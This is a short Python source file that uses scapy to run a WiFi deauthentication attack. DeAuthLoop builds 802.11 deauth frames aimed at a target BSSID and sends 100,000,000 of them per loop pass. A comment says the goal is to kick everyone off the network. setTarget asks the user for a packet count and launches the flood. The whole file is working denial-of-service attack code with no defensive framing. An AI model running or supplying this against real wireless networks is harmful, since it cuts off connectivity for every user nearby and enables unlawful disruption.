from scapy.all import sendp
from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11


def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
    """Creates Dot11Deauth packets that will disconnect the target address from the network.
    @param interface: The interface
    @param brdMac: The broadcast address
    @param BSSID: The target address
    @param numOfPack: The num Of Pack we wish to send"""
    # Addr1 is the broadcast addr
    # Addr2 is the target addr
    # Addr3 is used to target specific clients(users) (but I set it to the target addr to kick everyone off the network)
    # Interface is the full wlan address. (can be found via the terminal... run command 'pwconfig' and find the desired device)
    for i in range(0, numOfPack):
        pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
        sendp(pkt, iface=interface, count=100000000,
              inter=.001)  # Send the packets


def setTarget(brdMac, interface, BSSID):
    """Gets from the user how many packets to send, and makes the attack with the DeAuthLoop function.
    @param brdMac: The broadcast address
    @param interface: The interface
    @param BSSID: The target address"""
    numOfPack = int(input("How many packets to send?"))
    DeAuthLoop(interface, brdMac, BSSID, numOfPack)

    return
